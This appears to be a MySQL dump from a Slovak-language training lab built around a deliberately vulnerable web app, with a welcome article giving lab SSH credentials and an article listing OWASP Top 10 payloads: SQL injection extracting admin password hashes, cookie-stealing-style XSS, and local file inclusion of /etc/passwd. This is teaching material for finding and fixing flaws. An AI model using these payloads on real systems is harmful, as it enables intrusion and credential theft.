-- MySQL dump 10.13  Distrib 5.5.43, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: udpb
-- ------------------------------------------------------
-- Server version	5.5.43-0+deb7u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `admins`
--

DROP TABLE IF EXISTS `admins`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `admins` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(256) NOT NULL,
  `password` varchar(512) NOT NULL,
  `group` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `admins`
--

LOCK TABLES `admins` WRITE;
/*!40000 ALTER TABLE `admins` DISABLE KEYS */;
INSERT INTO `admins` VALUES (1,'student','32ade5e7c36fa329ea39dbc352743db40da5aa7460ec55f95b999d6371ad20170094d88d9296643f192e9d5433b8d6d817d6777632e556e96e58f741dc5b3550',9);
/*!40000 ALTER TABLE `admins` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `articles`
--

DROP TABLE IF EXISTS `articles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `articles` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(512) NOT NULL,
  `content` text NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `author` int(11) NOT NULL,
  `status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `articles`
--

LOCK TABLES `articles` WRITE;
/*!40000 ALTER TABLE `articles` DISABLE KEYS */;
INSERT INTO `articles` VALUES (2,'Second article','<br>\r\nA1 - Injection: Search - %\" UNION SELECT ALL 1,concat(password,char(58)),3,4,5,6 from admins where name=\'student\'--  (bacha na posledný znak, musí byť whitespace)\r\n<br>\r\nA2-Broken Authentication and Session Management GET /?page=logout.php&session_id=5tk8tsccght7gvt9jgh6nj9336&go_page=index.php (sessionid disclosure)\r\n<br>\r\nA3 - XSS - Search - <script>alert(document.cookie)</script>\r\n<br>\r\nA4 - Insecure Direct Object References - koment v indexe - http://192.168.56.102/preview.php?file=../../../../etc/passwd (LFI)\r\n<br>\r\nA5 - Security Misconfiguration - Search - \"\r\n<br>\r\nA6 - Sensitive Data Exposure - GET /?page=logout.php&session_id=5tk8tsccght7gvt9jgh6nj9336&go_page=index.php (SSL)\r\n<br>\r\nA7 - Missing Function Level Access Control - http://192.168.56.102/content/home.php?id=2\r\n<br> \r\nA8 - Cross-Site Request Forgery (CSRF) - eclipse.fei.sk/~Orem/poc.html alebo /poc.html\r\n<br>\r\nA10 - Unvalidated Redirects and Forwards -\r\nGET /?page=logout.php&session_id=5tk8tsccght7gvt9jgh6nj9336&go_page=http//citadelo.com \r\n','2015-04-06 18:13:19',1,1),(3,'Ooooo this is number three','Donec sodales nibh metus, sit amet fermentum dui aliquet vitae. Cras at tempus nibh, tempor vestibulum sem. Vestibulum auctor, dui eget euismod tincidunt, dolor elit venenatis ante, condimentum scelerisque orci mauris ac ex. Maecenas vel massa erat. Nulla ac quam ut ex vulputate ultricies. Aenean rhoncus ex vitae augue commodo, quis dignissim massa accumsan. Pellentesque mattis tincidunt sem vitae pulvinar. Sed tincidunt sollicitudin tellus, sit amet imperdiet ipsum semper ut. Nullam nec nunc sit amet felis pulvinar consectetur eget non odio. Aenean vitae justo nec lacus varius placerat eu in tortor. Suspendisse tellus mi, fringilla ut molestie quis, ornare dignissim diam.\r\n\r\nProin eget condimentum nibh. Cras ultricies, nisl at eleifend tincidunt, felis quam efficitur mi, vitae lobortis nulla ipsum ut nulla. Nulla facilisi. Aliquam dictum urna eget dolor malesuada suscipit. Mauris id lacus id urna commodo pulvinar. Vivamus eget arcu nulla. Mauris aliquet mollis nisl vitae viverra. Cras maximus eleifend magna, non maximus orci hendrerit eu. Fusce eget luctus mi, id porttitor quam.\r\n\r\nMaecenas sollicitudin, nunc id faucibus bibendum, quam eros congue purus, quis varius massa ligula in felis. Morbi in fermentum quam. Aliquam erat volutpat. Aenean et lacus et nunc condimentum ultricies. Sed vel cursus enim, non tristique nunc. Phasellus vel tortor ut sem porta sollicitudin nec et leo. Suspendisse iaculis tortor lectus, eget commodo ligula tincidunt a.','2015-02-28 23:29:37',1,0),(4,'Ooooo this is number three4','Donec sodales nibh metus, sit amet fermentum dui aliquet vitae. Cras at tempus nibh, tempor vestibulum sem. Vestibulum auctor, dui eget euismod tincidunt, dolor elit venenatis ante, condimentum scelerisque orci mauris ac ex. Maecenas vel massa erat. Nulla ac quam ut ex vulputate ultricies. Aenean rhoncus ex vitae augue commodo, quis dignissim massa accumsan. Pellentesque mattis tincidunt sem vitae pulvinar. Sed tincidunt sollicitudin tellus, sit amet imperdiet ipsum semper ut. Nullam nec nunc sit amet felis pulvinar consectetur eget non odio. Aenean vitae justo nec lacus varius placerat eu in tortor. Suspendisse tellus mi, fringilla ut molestie quis, ornare dignissim diam.\r\n\r\nProin eget condimentum nibh. Cras ultricies, nisl at eleifend tincidunt, felis quam efficitur mi, vitae lobortis nulla ipsum ut nulla. Nulla facilisi. Aliquam dictum urna eget dolor malesuada suscipit. Mauris id lacus id urna commodo pulvinar. Vivamus eget arcu nulla. Mauris aliquet mollis nisl vitae viverra. Cras maximus eleifend magna, non maximus orci hendrerit eu. Fusce eget luctus mi, id porttitor quam.\r\n\r\nMaecenas sollicitudin, nunc id faucibus bibendum, quam eros congue purus, quis varius massa ligula in felis. Morbi in fermentum quam. Aliquam erat volutpat. Aenean et lacus et nunc condimentum ultricies. Sed vel cursus enim, non tristique nunc. Phasellus vel tortor ut sem porta sollicitudin nec et leo. Suspendisse iaculis tortor lectus, eget commodo ligula tincidunt a.','2015-02-28 23:29:40',1,0),(5,'Welcome ','Vitaj na cvičení. Pokiaľ si sa dostal až po tento článok, úspešne sa ti podarilo spustiť virtualku k čomu ti gratulujem. Pred sebou vidíš zraniteľný web. Web, ktorý naprogramoval nešikovný kolega pred tebou a teba bohužiaľ poverili aby si čo najrýchlejšie zaplátal všetky zraniteľnosti na ktoré narazíš.\r\n<br>\r\n<br>\r\nZdrojové kódy nájdeš keď sa pripojíš cez terminál pomocou ssh\r\n<br>\r\nssh student@192.168.56.102\r\n<br>\r\npassword je student\r\n<br>\r\nCesta k zdrojákom: /var/www/\r\n<br>\r\nPayloady k jednotlivým zraniteľnostiam nájdeš v nasledujúcom článku.\r\n','2015-04-05 10:39:33',1,1);
/*!40000 ALTER TABLE `articles` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2015-06-07 10:33:37
